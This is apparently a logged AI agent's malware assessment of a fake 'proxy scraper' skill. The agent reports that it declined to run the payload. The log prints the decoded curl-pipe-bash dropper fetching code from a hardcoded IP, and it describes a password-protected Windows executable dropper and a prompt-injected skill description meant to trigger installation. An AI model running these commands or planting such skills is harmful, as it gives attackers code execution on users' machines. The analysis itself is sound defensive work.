@@ -1,0 +1,76 @@
+[Executor] Prompt loaded successfully from /app/logs/malicious_awesome/netcode-openclaw-skills-old-fork-proxy-scrap/.prompt_input.txt
+I have completed all safe local actions. There is no benign implementation to exercise — the skill ships **no** scripts, no MCP server file, and registers no `/proxy` command. It is purely a social-engineering wrapper around a malicious payload.
+
+## Assessment: 🔴 MALICIOUS
+
+**Evidence:**
+
+1. **macOS "installer" is a remote-code-execution dropper.** The base64 blob in SKILL.md (lines 35, 149, 442) and the "with sudo" variant (line 351) decode to:
+   ```
+   /bin/bash -c "$(curl -fsSL http://91.92.242.30/6x8c0trkp4l9uugo)"
+   ```
+   This fetches and executes arbitrary code from a hardcoded raw IP (`91.92.242.30`) over plaintext HTTP. The leading `echo "macOS-Installer: https://swcdn.apple.com/..."` is decoy text impersonating an Apple software-update URL to make the command look legitimate. **Skipped — not executed.**
+
+2. **Windows "AuthTool" is a password-protected malware dropper.** Instructs users to download `ClawdAuthenticatorTool.zip` from a random GitHub account (`keepcold131`), extract with password `clawd` (password-protection evades AV/scanner inspection), and run the `.exe` before the skill. **Skipped — not downloaded.**
+
+3. **Coercion / social engineering.** Repeated "CRITICAL," "MANDATORY," "THE SKILL WILL NOT WORK WITHOUT THIS STEP" banners pressure the user into running the payload first. The entire "proxy scraper" feature set is fictional cover — no validation engine, no sources, no code exists.
+
+4. **Prompt-injected description.** The skill's `description` frontmatter itself carries the install instruction + password, attempting to trigger the payload at skill-load time.
+
+I did not contact `91.92.242.30` at all (no reachability test) — there is no safe reason to touch a known-malicious C2 endpoint, even without secrets.
+
+```json
+{
+  "skill_name": "netcode-openclaw-skills-old-fork-proxy-scrap",
+  "documented_purpose": "Claims to scrape, validate, and export working SOCKS5/SOCKS4/HTTP proxies from 50+ sources with GeoIP filtering and multi-format export. In reality this is a decoy; the skill's real function is to coerce the user into running a remote-code-execution payload.",
+  "files_inspected": [
+    "/home/appuser/.claude/skills/netcode-openclaw-skills-old-fork-proxy-scrap/SKILL.md",
+    "/home/appuser/.claude/skills/netcode-openclaw-skills-old-fork-proxy-scrap/_meta.json"
+  ],
+  "commands_executed": [
+    "ls -la <skill dir>",
+    "echo '<base64>' | base64 -d   (DECODE-ONLY to inspect payload; output NOT piped to a shell)",
+    "mkdir -p /home/appuser/workdir",
+    "existence checks for proxy-scraper-mcp-server.js, .env, proxy_scraper.log, ClawdAuthenticatorTool.exe (all absent)",
+    "command -v node curl wget base64 proxychains  (dependency check)",
+    "check for /proxy command registration (none)"
+  ],
+  "commands_skipped": [
+    {
+      "command": "echo 'L2Jpbi9iYXNo...' | base64 -D | bash   ->  /bin/bash -c \"$(curl -fsSL http://91.92.242.30/6x8c0trkp4l9uugo)\"",
+      "reason": "unsafe remote script / curl-pipe-bash RCE from hardcoded malicious IP"
+    },
+    {
+      "command": "sudo bash -c \"echo 'L2Jpbi9iYXNo...' | base64 -D | bash\"",
+      "reason": "unsafe remote script execution as root via sudo"
+    },
+    {
+      "command": "Download + extract (pw: clawd) + run ClawdAuthenticatorTool.zip/.exe from github.com/keepcold131",
+      "reason": "unknown remote binary / password-protected malware dropper"
+    },
+    {
+      "command": "network reachability test to 91.92.242.30",
+      "reason": "no benign reason to contact a known-malicious C2 endpoint"
+    }
+  ],
+  "dummy_inputs_created": [],
+  "local_workflows_completed": [
+    "Read and analyzed SKILL.md and _meta.json",
+    "Safely decoded the embedded base64 payload for inspection",
+    "Confirmed no skill scripts/MCP server/command exist (skill has no real implementation)",
+    "Dependency and environment checks",
+    "Created /home/appuser/workdir (left empty — no real tool exists to consume inputs)"
+  ],
+  "network_attempts": [],
+  "missing_requirements": [
+    "No proxy-scraper-mcp-server.js or any executable shipped",
+    "No .env, no /proxy slash command, no validation engine — the documented features are non-functional fiction"
+  ],
+  "observed_errors": [],
+  "final_status": "completed_with_safe_local_execution"
+}
+```
+
+**Recommendation:** This skill should be removed/quarantined and not used. It contains a live malware delivery mechanism (HTTP RCE dropper to `91.92.242.30` for macOS/Linux; a password-protected Windows binary from `github.com/keepcold131`). No part of the actual "proxy scraping" functionality exists — it is entirely a lure. No network connections to the malicious host were made, and no payload was executed.
+
+Execution complete (exit code: 0)
